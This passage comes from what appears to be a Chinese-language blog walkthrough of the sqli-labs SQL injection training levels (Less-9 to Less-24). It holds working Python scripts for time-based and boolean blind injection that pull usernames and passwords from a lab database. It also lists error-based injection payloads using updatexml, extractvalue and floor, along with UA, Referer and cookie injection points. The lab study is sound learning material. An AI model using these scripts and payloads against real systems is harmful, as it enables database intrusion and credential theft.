class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs n1ql&#34;&gt;import requests&lt;br&gt;import time&lt;br&gt;&lt;br&gt;url = &amp;quot;http://47.96.233.216:8080/Less-9/?id=1&amp;#x27;&amp;quot;&lt;br&gt;&lt;br&gt;test = &amp;quot;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;()&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;schema = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; schema_name &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;table = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; table_name &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.tables &lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt; table_schema=&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;() &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;column = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; column_name &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.columns &lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt; table_name=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;users&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;data = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; concat_ws(&lt;span class=&#34;hljs-number&#34;&gt;0x5e&lt;/span&gt;,username,&lt;span class=&#34;hljs-keyword&#34;&gt;password&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; security.users &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;result = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;for i in range(1,10):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	for j in range(48,122):(test,i,j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		payload = url + &amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(ascii(&lt;span class=&#34;hljs-built_in&#34;&gt;substr&lt;/span&gt;((&amp;#123;&amp;#125;),&amp;#123;&amp;#125;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))=&amp;#123;&amp;#125;,sleep(&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;),&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)--+&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.format(data,i,j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		t1 = time.time()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		r = requests.get(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		t2 = time.time()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		if(t2-t1&amp;gt;=2):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			result+=chr(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			print(result)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			break&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;less-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-10&#34;&gt;#&lt;/a&gt; Less-10&lt;/h2&gt;
&lt;p&gt;用 &lt;code&gt;&amp;quot;&lt;/code&gt;  闭合&lt;/p&gt;
&lt;h2 id=&#34;less-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-11&#34;&gt;#&lt;/a&gt; Less-11&lt;/h2&gt;
&lt;p&gt;由于请求方式是 post，因此要用 BurpSuit 抓包，可以发现账号密码处存在注入点&lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/8.png&#34; alt=&#34;sql&#34; class=&#34;lazyload&#34;&gt;&lt;br&gt;
#Less-12&lt;br&gt;
 同上，用 &lt;code&gt;&amp;quot;)&lt;/code&gt;  闭合&lt;br&gt;
 #Less-13&lt;br&gt;
 可以发现页面没有回显，通过返回图片的不同可以发现是 bool 盲注，而且时间盲注应该是可以的，但是由于返回的数据包不同点是图片不相同，不能通过判断长度进行布尔盲注，可以用 &lt;code&gt;if(s in r.txt)&lt;/code&gt;  进行判断&lt;br&gt;
先放一下脚本：&lt;/p&gt;
&lt;figure class=&#34;highlight nix&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs nix&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;url&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://47.96.233.216:8080/Less-13/&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;test&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;select database()&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;schema&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;select schema_name from information_schema.schemata limit 0,1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;table&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;select table_name from information_schema.tables where table_schema=database() limit 1,1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;column&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;select column_name from information_schema.columns where table_name=&amp;#x27;users&amp;#x27; limit 0,1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;data&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;select concat_ws(0x5e,username,password) from security.users limit 0,1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;result&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;for i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; range(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;):&lt;br&gt;	for j &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; range(&lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;122&lt;/span&gt;):&lt;br&gt;		&lt;span class=&#34;hljs-attr&#34;&gt;payload&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;admin&amp;#x27;) and ascii(substr((&amp;#123;0&amp;#125;),&amp;#123;1&amp;#125;,1))=&amp;#123;2&amp;#125; #&amp;quot;&lt;/span&gt;.format(test,i,j)&lt;br&gt;		&lt;span class=&#34;hljs-attr&#34;&gt;post_r&lt;/span&gt; = &amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;uname&amp;quot;&lt;/span&gt;:payload,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;passwd&amp;quot;&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&amp;#125;&lt;br&gt;		&lt;span class=&#34;hljs-attr&#34;&gt;r&lt;/span&gt; = requests.post(url,&lt;span class=&#34;hljs-attr&#34;&gt;data=post_r)&lt;/span&gt;&lt;br&gt;		&lt;span class=&#34;hljs-attr&#34;&gt;l&lt;/span&gt; = len(r.text)&lt;br&gt;		&lt;span class=&#34;hljs-attr&#34;&gt;txt&lt;/span&gt; = r.text&lt;br&gt;		&lt;span class=&#34;hljs-attr&#34;&gt;s&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;../images/flag.jpg&amp;quot;&lt;/span&gt;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (s &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; txt):&lt;br&gt;			result+=chr(j)&lt;br&gt;			print(result)&lt;br&gt;			break&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;以及一个网上找的一个较好的脚本‘&lt;a href=&#34;https://blog.csdn.net/vhkjhwbs/article/details/98960802%E2%80%99%EF%BC%9A&#34;&gt;https://blog.csdn.net/vhkjhwbs/article/details/98960802’：&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt; &lt;br&gt;chars = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&amp;amp;%/^!~&amp;quot;&lt;/span&gt;&lt;br&gt;result = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt; &lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;get_length&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;value&lt;/span&gt;):&lt;/span&gt;  &lt;span class=&#34;hljs-comment&#34;&gt;#获取要查询的数据的长度&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; n &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;):&lt;br&gt;        payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;admin&amp;#x27;) and length((&amp;#123;0&amp;#125;)) =&amp;#123;1&amp;#125; #&amp;quot;&lt;/span&gt;.&lt;span class=&#34;hljs-built_in&#34;&gt;format&lt;/span&gt;(data_payload,n)&lt;br&gt;        data = &amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;uname&amp;quot;&lt;/span&gt;:payload,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;passwd&amp;quot;&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&amp;#125;&lt;br&gt;        html = requests.post(url,data=data)&lt;br&gt;        length = &lt;span class=&#34;hljs-built_in&#34;&gt;len&lt;/span&gt;(html.text)&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; length &amp;gt;value:&lt;br&gt;            &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;……data length is :&amp;quot;&lt;/span&gt; + &lt;span class=&#34;hljs-built_in&#34;&gt;str&lt;/span&gt;(n))&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;  n&lt;br&gt; &lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;get_data&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;data_length,value&lt;/span&gt;):&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;#获取数据&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;global&lt;/span&gt; result&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,data_length):&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; char &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; chars:&lt;br&gt;            payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;admin&amp;#x27;)and ascii(substr((&amp;#123;0&amp;#125;),&amp;#123;1&amp;#125;,1))=&amp;#123;2&amp;#125; #&amp;quot;&lt;/span&gt;.&lt;span class=&#34;hljs-built_in&#34;&gt;format&lt;/span&gt;(data_payload,i,&lt;span class=&#34;hljs-built_in&#34;&gt;ord&lt;/span&gt;(char))&lt;br&gt;            data = &amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;uname&amp;quot;&lt;/span&gt;:payload,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;passwd&amp;quot;&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&amp;#125;&lt;br&gt;            html = requests.post(url,data=data)&lt;br&gt;            length = &lt;span class=&#34;hljs-built_in&#34;&gt;len&lt;/span&gt;(html.text)&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; length&amp;gt;value:         &lt;span class=&#34;hljs-comment&#34;&gt;#根据返回长度的不同来判断字符正确与否&lt;/span&gt;&lt;br&gt;                result += char&lt;br&gt;                &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;…… data is :&amp;quot;&lt;/span&gt;+ result)&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;&lt;br&gt; &lt;br&gt; &lt;br&gt;url = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://47.96.233.216:8080/Less-13/&amp;quot;&lt;/span&gt;&lt;br&gt;data_payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;select group_concat(table_name)from information_schema.tables where table_schema = database()&amp;quot;&lt;/span&gt;&lt;br&gt;value = &lt;span class=&#34;hljs-number&#34;&gt;1460&lt;/span&gt; &lt;br&gt; &lt;br&gt;length = get_length(value) +&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;get_data(length,value)&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(result)&lt;br&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;less-14&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-14&#34;&gt;#&lt;/a&gt; Less-14&lt;/h2&gt;
&lt;p&gt;用 &lt;code&gt;&amp;quot;&lt;/code&gt;  闭合&lt;/p&gt;
&lt;h2 id=&#34;less-15&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-15&#34;&gt;#&lt;/a&gt; Less-15&lt;/h2&gt;
&lt;p&gt;同第十三关脚本&lt;/p&gt;
&lt;h2 id=&#34;less-16&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-16&#34;&gt;#&lt;/a&gt; Less-16&lt;/h2&gt;
&lt;p&gt;用 &lt;code&gt;&amp;quot;)&lt;/code&gt;  闭合&lt;/p&gt;
&lt;h2 id=&#34;less-17&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-17&#34;&gt;#&lt;/a&gt; Less-17&lt;/h2&gt;
&lt;p&gt;盲猜报错注入&lt;/p&gt;
&lt;h3 id=&#34;数据类型溢出&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数据类型溢出&#34;&gt;#&lt;/a&gt; 数据类型溢出&lt;/h3&gt;
&lt;p&gt;select exp(~(select*from(select user())x));   # MySQL &amp;lt; 5.5.53&lt;br&gt;
pow, cot&lt;/p&gt;
&lt;h3 id=&#34;几何函数报错&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#几何函数报错&#34;&gt;#&lt;/a&gt; 几何函数报错&lt;/h3&gt;
&lt;p&gt;select multipoint ((select * from (select * from (select version ()) a) b)); # 低版本&lt;br&gt;
 geometrycollection multipoint polygon multipolygon linestring multilinestring 等&lt;/p&gt;
&lt;h3 id=&#34;xpath语法错误&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xpath语法错误&#34;&gt;#&lt;/a&gt; Xpath 语法错误&lt;/h3&gt;
&lt;p&gt;select updatexml(1,concat(0x3a,(select @@version),0x3a),1) # MySQL &amp;gt; 5.1&lt;br&gt;
select extractvalue(1,concat(0x3a,(select @@version),0x3a))&lt;/p&gt;
&lt;p&gt;另外当 concat 被过滤时可以&lt;br&gt;
 updatexml (1,make_set (3,’’,(select version ())),1)&lt;/p&gt;
&lt;h3 id=&#34;报错注入的几种函数及其用法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#报错注入的几种函数及其用法&#34;&gt;#&lt;/a&gt; 报错注入的几种函数及其用法：&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;floor(): &lt;code&gt;select count(*) from infromation_schema.tables group by concat((select database()),floor(rand(0)*2));&lt;/code&gt; group by 对 rand () 函数进行操作时产生错误&lt;/li&gt;
&lt;li&gt;extractvalue(): &lt;code&gt;extractualue(1,concat(0x7e,(select database()),0x7e));&lt;/code&gt; XPATH 语法错误报错&lt;/li&gt;
&lt;li&gt;updatexml(): &lt;code&gt;select updatexml(1,concat(0x7e,(select database()),0x7e),1);&lt;/code&gt; XPATH 语法错误报错&lt;/li&gt;
&lt;li&gt;MYSQL5.7 新增： &lt;code&gt;select gtid_subset((select @@version), 2);&lt;/code&gt; &lt;br&gt;
 在 passwd 处存在注入点：&lt;br&gt;
payload： &lt;code&gt;11111&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),321)--+&lt;/code&gt; &lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/9.png&#34; alt=&#34;sql&#34; class=&#34;lazyload&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;less-18&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-18&#34;&gt;#&lt;/a&gt; Less-18&lt;/h2&gt;
&lt;p&gt;可以猜测 UA 可能存在注入点&lt;br&gt;
构造 UA &lt;code&gt;&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;=&#39;1&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;less-19&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-19&#34;&gt;#&lt;/a&gt; Less-19&lt;/h2&gt;
&lt;p&gt;reffer 存在注入点，其余同上&lt;/p&gt;
&lt;h2 id=&#34;less-20&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-20&#34;&gt;#&lt;/a&gt; Less-20&lt;/h2&gt;
&lt;p&gt;打开提示 cookie，那就先抓个包，构造 cookie &lt;code&gt;uname=admin&#39;&lt;/code&gt;  发现报错，可知存在注入点，其余就是正常步骤，先判断列数，可以发现是 3。。。。&lt;/p&gt;
&lt;h2 id=&#34;less-21&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-21&#34;&gt;#&lt;/a&gt; Less-21&lt;/h2&gt;
&lt;p&gt;用 &lt;code&gt;&#39;)&lt;/code&gt;  闭合，并且是要经过 base64 编码，其余同上&lt;/p&gt;
&lt;h2 id=&#34;less-22&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-22&#34;&gt;#&lt;/a&gt; Less-22&lt;/h2&gt;
&lt;p&gt;用 &lt;code&gt;&amp;quot;&lt;/code&gt;  闭合&lt;/p&gt;
&lt;h2 id=&#34;less-23&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-23&#34;&gt;#&lt;/a&gt; Less-23&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;#&lt;/code&gt; 以及 &lt;code&gt;--&lt;/code&gt;  被过滤&lt;br&gt;
那就用 &lt;code&gt;or &#39;1&#39;=&#39;1&lt;/code&gt;  来闭合多余出来的单引号&lt;/p&gt;
&lt;h2 id=&#34;less-24&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-24&#34;&gt;#&lt;/a&gt; Less-24&lt;/h2&gt;
&lt;p&gt;二次注入&lt;br&gt;
